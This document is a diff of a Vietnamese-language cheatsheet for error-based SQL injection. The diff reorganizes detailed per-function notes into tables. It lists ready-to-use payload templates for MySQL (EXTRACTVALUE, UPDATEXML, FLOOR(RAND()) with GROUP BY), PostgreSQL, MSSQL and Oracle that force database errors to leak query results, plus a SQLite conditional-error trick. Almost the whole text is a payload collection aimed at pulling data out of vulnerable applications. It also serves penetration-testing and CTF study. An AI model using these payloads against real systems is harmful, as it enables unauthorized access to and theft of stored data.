@@ -1,192 +1,89 @@
-# Table of content
-* [MySQL](#MySQL)
-* [PostgreSQL](#PostgreSQL)
-* [MSSQL](#MSSQL)
-* [Oracle](#Oracle)
-* [Sqlite](#Sqlite)
+# SQLi Error-Based Cheatsheet
 
-# MySQL
-Ta nên sử dụng payload `CONCAT('~', data, '~')` ở vị trí `subquery` để thêm marker cho dễ đọc.
-### 1. EXTRACTVALUE(xml, xpath)
-- **xml**: dữ liệu XML đầu vào, trong payload thường không quan trọng
-- **xpath**: biểu thức XPath, là chỗ bị lợi dụng để gây lỗi
-- **Cơ chế khai thác:** làm `xpath` sai cú pháp để error message hiện ra dữ liệu
-```sql
-EXTRACTVALUE(1, (<subquery>))
-```
-### 2. UPDATEXML(xml_target, xpath_expr, new_xml)
-- **xml_target**: dữ liệu XML đầu vào, thường không quan trọng trong payload
-- **xpath_expr**: biểu thức XPath, là chỗ bị lợi dụng để gây lỗi
-- **new_xml**: dữ liệu XML mới để thay thế, trong payload thường chỉ truyền đại
-- **Cơ chế khai thác:** làm `xpath_expr` sai cú pháp để MySQL trả lỗi chứa dữ liệu
-```sql
-UPDATEXML(1, (<subquery>), 1)
-```
-### 3. GTID_SUBSET(gtid_set1, gtid_set2)
-- **gtid_set1**: tập GTID thứ nhất
-- **gtid_set2**: tập GTID thứ hai
-- **Cơ chế khai thác:** truyền GTID format sai để hàm parse lỗi và hiện dữ liệu trong thông báo lỗi
-```sql
-GTID_SUBSET((<subquery>), 1)
-```
-### 4. JSON_KEYS(json_doc)
-- **json_doc**: tài liệu JSON đầu vào
-- **Cơ chế khai thác:** đưa dữ liệu không phải JSON hợp lệ vào để gây lỗi parse JSON và làm lộ dữ liệu
-```sql
-JSON_KEYS((<subquery>))
-```
-### 5. NAME_CONST(name, value)
-- **name**: tên hằng / tên cột được tạo ra
-- **value**: giá trị của hằng
-- **Cơ chế khai thác:** tạo 2 cột trùng tên, trong đó `name` chứa dữ liệu cần leak, khiến MySQL báo lỗi duplicate column
-```sql
-SELECT NAME_CONST((<subquery>),1), NAME_CONST((<subquery>),1)
-```
-### 6. FLOOR(RAND()) + GROUP BY
-- **RAND(0)**: sinh giá trị giả ngẫu nhiên nhưng có tính lặp
-- **FLOOR(...*2)**: ép về 0 hoặc 1 để dễ tạo va chạm
-- **GROUP BY**: nhóm theo giá trị có chứa dữ liệu cần leak
-- **Cơ chế khai thác:** tạo lỗi duplicate entry, dữ liệu xuất hiện trong giá trị bị trùng
-```sql
-SELECT COUNT(*), CONCAT('~', (<subquery>), '~', FLOOR(RAND(0)*2)) AS x
-FROM (SELECT 1 UNION SELECT 2) a
-GROUP BY x
-```
-### 7. EXP(expr)
-- **expr**: biểu thức số học đầu vào
-- **Cơ chế khai thác:** ép dữ liệu chuỗi vào ngữ cảnh số học để gây lỗi ép kiểu hoặc overflow
-```sql
-EXP(~(<subquery>))
-```
-### 8. UUID_TO_BIN(string_uuid)
-- **string_uuid**: chuỗi UUID đầu vào
-- **Cơ chế khai thác:** truyền dữ liệu không đúng format UUID để gây lỗi parse và làm lộ dữ liệu
-```sql
-UUID_TO_BIN((<subquery>))
-```
-...
+## Table of Contents
+- [MySQL](#mysql)
+- [PostgreSQL](#postgresql)
+- [MSSQL](#mssql)
+- [Oracle](#oracle)
+- [SQLite](#sqlite)
 
-# PostgreSQL
-Ta nên sử dụng marker như `'~'||data||'~'` ở vị trí `subquery` để thêm marker cho dễ đọc.
+---
 
-### 1. CAST(expr AS type) / expr::type
-- **expr**: giá trị cần ép kiểu
-- **type**: kiểu dữ liệu đích như `INT`, `NUMERIC`
-- **Cơ chế khai thác:** ép một chuỗi không thể chuyển sang số sang kiểu số để PostgreSQL báo lỗi và hiện dữ liệu trong thông báo lỗi
-```sql
-CAST((<subquery>) AS NUMERIC) hoặc (<subquery>)::NUMERIC
-```
+## MySQL
 
-# MSSQL
+> Marker hay dùng: `CONCAT('~', data, '~')`
 
-Ta nên sử dụng marker như `'~'+data+'~'` ở vị trí `subquery` để thêm marker cho dễ đọc.
+| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
+|---|---|---|---|
+| `EXTRACTVALUE(xml, xpath)` | Làm XPath lỗi để lỗi hiện dữ liệu | `EXTRACTVALUE(1, (<subquery>))` | Có XML function |
+| `UPDATEXML(xml_target, xpath_expr, new_xml)` | Tương tự `EXTRACTVALUE`, lỗi XPath | `UPDATEXML(1, (<subquery>), 1)` | Có XML function |
+| `GTID_SUBSET(gtid_set1, gtid_set2)` | Đưa GTID sai format để lỗi parse hiện dữ liệu | `GTID_SUBSET((<subquery>), 1)` | Có GTID function |
+| `JSON_KEYS(json_doc)` | Đưa dữ liệu không phải JSON để lỗi parse JSON | `JSON_KEYS((<subquery>))` | Có JSON function |
+| `NAME_CONST(name, value)` | Tạo 2 cột trùng tên để ra duplicate column error | `SELECT NAME_CONST((<subquery>),1), NAME_CONST((<subquery>),1)` | Cần lỗi duplicate column |
+| `FLOOR(RAND()) + GROUP BY` | Tạo key bị trùng để ra duplicate entry error | `SELECT COUNT(*), CONCAT('~',(<subquery>),'~',FLOOR(RAND(0)*2)) x FROM ... GROUP BY x` | Cần duplicate entry |
+| `EXP(expr)` | Ép dữ liệu vào ngữ cảnh số học để gây lỗi cast/overflow | `EXP(~(<subquery>))` | Muốn thử numeric error |
+| `UUID_TO_BIN(string_uuid)` | Đưa dữ liệu không phải UUID để lỗi parse | `UUID_TO_BIN((<subquery>))` | Có UUID function |
 
-### 1. CONVERT(data_type, expression)
-- **data_type**: kiểu dữ liệu đích như `INT`
-- **expression**: giá trị cần chuyển kiểu
-- **Cơ chế khai thác:** ép một chuỗi không thể chuyển sang số sang kiểu số để SQL Server báo lỗi và hiện dữ liệu trong thông báo lỗi
-```sql
-CONVERT(INT, (<subquery>))
-```
-### 2. CAST(expression AS data_type)
-- **expression**: giá trị cần ép kiểu
-- **data_type**: kiểu dữ liệu đích như `INT`
-- **Cơ chế khai thác:** tương tự `CONVERT`, ép chuỗi không thể chuyển sang số sang kiểu số để sinh lỗi conversion
+---
 
-```sql
-CAST((<subquery>) AS INT)
-```
-### 3. IN (subquery / value list)
-- **vế trái**: giá trị đem đi so sánh, ví dụ `1337`
-- **vế phải**: tập giá trị hoặc subquery
-- **Cơ chế khai thác:** bản thân `IN` không gây lỗi; lỗi xuất hiện khi SQL Server phải so sánh số với chuỗi không thể convert, từ đó phát sinh lỗi chuyển kiểu và làm lộ dữ liệu
+## PostgreSQL
 
-```sql
-1337 IN (SELECT (<subquery>))
-```
-### 4. EQUAL / so sánh bằng (`=`)
-- **vế trái**: giá trị dùng để so sánh, ví dụ số `1337`
-- **vế phải**: biểu thức chứa dữ liệu cần leak
-- **Cơ chế khai thác:** bản thân toán tử `=` không gây lỗi; lỗi xuất hiện khi SQL Server cố chuyển chuỗi ở một vế sang kiểu số của vế còn lại để thực hiện so sánh
+> Marker hay dùng: `'~'||data||'~'`
 
-```sql
-1337 = (<subquery>)
-```
+| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
+|---|---|---|---|
+| `CAST(expr AS type)` | Ép chuỗi sang số để báo lỗi conversion | `CAST((<subquery>) AS NUMERIC)` | Cơ bản, dễ dùng |
+| `expr::type` | Viết tắt của cast, cùng cơ chế | `(<subquery>)::NUMERIC` | Payload ngắn |
+| `query_to_xml(query, nulls, tableforest, targetns)` + `CAST` | Gom nhiều dòng thành XML rồi ép kiểu để lỗi | `CAST(query_to_xml('<query>',true,true,'') AS NUMERIC)` | Muốn leak nhiều dòng |
+| `database_to_xml(nulls, tableforest, targetns)` + `CAST` | Dump DB thành XML rồi ép kiểu để lỗi | `CAST(database_to_xml(true,true,'') AS NUMERIC)` | Muốn gom nhiều dữ liệu |
 
-# Oracle
+---
 
-Ta nên sử dụng marker như `'||'~'||data||'~'||'` hoặc ghép bằng `CHR(126)` để thêm marker cho dễ đọc.
-### 1. UTL_INADDR.GET_HOST_NAME(ip_address)
-- **ip_address**: địa chỉ IP hoặc chuỗi đầu vào để resolve hostname
-- **Cơ chế khai thác:** truyền vào dữ liệu không hợp lệ để Oracle báo lỗi network / host lookup và làm lộ dữ liệu trong thông báo lỗi
+## MSSQL
 
-```sql
-UTL_INADDR.GET_HOST_NAME((<subquery>))
-```
-### 2. CTXSYS.DRITHSX.SN(owner, text)
-- **owner**: user/schema
-- **text**: chuỗi đầu vào
-- **Cơ chế khai thác:** truyền dữ liệu đặc biệt vào hàm của Oracle Text để sinh lỗi và làm lộ dữ liệu trong thông báo lỗi
+> Marker hay dùng: `'~'+data+'~'`
 
-```sql
-CTXSYS.DRITHSX.SN(USER, (<subquery>))
-```
-### 3. ORDSYS.ORD_DICOM.GETMAPPINGXPATH(input, arg1, arg2)
-- **input**: dữ liệu đầu vào
-- **arg1 / arg2**: tham số phụ
-- **Cơ chế khai thác:** truyền dữ liệu không hợp lệ vào ngữ cảnh XPath để Oracle báo lỗi XPath và làm lộ dữ liệu
+| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
+|---|---|---|---|
+| `CONVERT(data_type, expression)` | Ép chuỗi sang số để ra conversion error | `CONVERT(INT, (<subquery>))` | Cơ bản, dễ dùng |
+| `CAST(expression AS data_type)` | Tương tự `CONVERT` | `CAST((<subquery>) AS INT)` | Payload ngắn |
+| `IN (subquery / value list)` | So sánh số với chuỗi để SQL Server tự ép kiểu và lỗi | `1337 IN (SELECT (<subquery>))` | Injection nằm trong điều kiện |
+| `=` | So sánh số với chuỗi để sinh conversion error | `1337 = (<subquery>)` | Injection nằm trong điều kiện |
 
-```sql
-ORDSYS.ORD_DICOM.GETMAPPINGXPATH((<subquery>), USER, USER)
-```
-### 4. CAST(expr AS type)
-- **expr**: giá trị cần ép kiểu
-- **type**: kiểu dữ liệu đích như `NUMBER`
-- **Cơ chế khai thác:** ép một chuỗi không thể chuyển sang số sang kiểu số để Oracle báo lỗi conversion
+---
 
-```sql
-CAST((<subquery>) AS NUMBER)
-```
+## Oracle
 
-### 5. XDBURITYPE(value).getBlob()
-- **value**: URI / chuỗi đầu vào
-- **getBlob()**: lấy nội dung dạng BLOB
-- **Cơ chế khai thác:** truyền dữ liệu không hợp lệ vào ngữ cảnh URI/XML DB để sinh lỗi và làm lộ dữ liệu
+> Khi injection nằm trong string: `'||PAYLOAD--`  
+> Marker hay dùng: `CHR(126)` hoặc `'||'~'||data||'~'||'`
 
-```sql
-XDBURITYPE((<subquery>)).getBlob()
-```
-### 6. XDBURITYPE(value).getClob()
-- **value**: URI / chuỗi đầu vào
-- **getClob()**: lấy nội dung dạng CLOB
-- **Cơ chế khai thác:** tương tự `getBlob()`, lợi dụng lỗi xử lý URI/XML DB để làm lộ dữ liệu
+| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
+|---|---|---|---|
+| `UTL_INADDR.GET_HOST_NAME(ip_address)` | Đưa dữ liệu sai vào host lookup để lỗi hiện dữ liệu | `UTL_INADDR.GET_HOST_NAME((<subquery>))` | Có quyền gọi package |
+| `CTXSYS.DRITHSX.SN(owner, text)` | Lợi dụng lỗi từ Oracle Text | `CTXSYS.DRITHSX.SN(USER, (<subquery>))` | Có Oracle Text |
+| `ORDSYS.ORD_DICOM.GETMAPPINGXPATH(input, arg1, arg2)` | Đưa dữ liệu vào ngữ cảnh XPath để gây lỗi | `ORDSYS.ORD_DICOM.GETMAPPINGXPATH((<subquery>), USER, USER)` | Có package ORDSYS |
+| `CAST(expr AS type)` | Ép chuỗi sang số để gây conversion error | `CAST((<subquery>) AS NUMBER)` | Cơ bản, dễ hiểu |
+| `XDBURITYPE(value).getBlob()` | Lợi dụng lỗi URI/XML DB | `XDBURITYPE((<subquery>)).getBlob()` | Có XML DB |
+| `XDBURITYPE(value).getClob()` | Tương tự `getBlob()` | `XDBURITYPE((<subquery>)).getClob()` | Có XML DB |
+| `XMLType(expr)` | Tạo XML lỗi để parse error hiện dữ liệu | `XMLType((<subquery>))` | Có XML parser |
+| `DBMS_UTILITY.SQLID_TO_SQLHASH(value)` | Đưa giá trị sai format để lỗi validation | `DBMS_UTILITY.SQLID_TO_SQLHASH((<subquery>))` | Có quyền gọi package |
 
-```sql
-XDBURITYPE((<subquery>)).getClob()
-```
-### 7. XMLType(expr)
-- **expr**: chuỗi/XML đầu vào
-- **Chức năng gốc:** tạo một đối tượng XMLType từ chuỗi XML
-- **Cơ chế khai thác:** tạo XML không hợp lệ để Oracle báo lỗi parse XML và làm lộ dữ liệu trong thông báo lỗi
+---
 
-```sql
-XMLType((<subquery>))
-```
-### 8. DBMS_UTILITY.SQLID_TO_SQLHASH(value)
-- **value**: SQL ID đầu vào
-- **Cơ chế khai thác:** truyền dữ liệu không đúng format SQL ID để Oracle báo lỗi parse/validation và làm lộ dữ liệu
+## SQLite
 
-```sql
-DBMS_UTILITY.SQLID_TO_SQLHASH((<subquery>))
-```
-# SQLite
+| Kỹ thuật | Ý tưởng | Mẫu | Áp dụng khi |
+|---|---|---|---|
+| `load_extension(path)` | Dùng nhánh lỗi để phân biệt đúng/sai | `CASE WHEN (<boolean_query>) THEN 1 ELSE load_extension(1) END` | Chủ yếu là conditional error |
 
-### 1. load_extension(path)
-- **Chức năng gốc:** nạp shared library extension vào SQLite
-- **Cơ chế khai thác:** gọi với đối số không hợp lệ hoặc khi extension loading bị cấm để tạo lỗi
-- **Vai trò trong SQLi:** thường dùng trong `CASE WHEN` để phân biệt đúng/sai qua việc có lỗi hay không
+---
 
-```sql
-CASE WHEN (<boolean_query>) THEN 1 ELSE load_extension(1) END
-```
+## Ghi nhớ nhanh
 
+| DBMS | Cơ chế chính |
+|---|---|
+| MySQL | XPath error, parser error, duplicate error |
+| PostgreSQL | Cast/type conversion error |
+| MSSQL | Cast/conversion error, comparison-triggered conversion |
+| Oracle | Package error, XML error, cast error |
+| SQLite | Conditional error qua `load_extension()` |
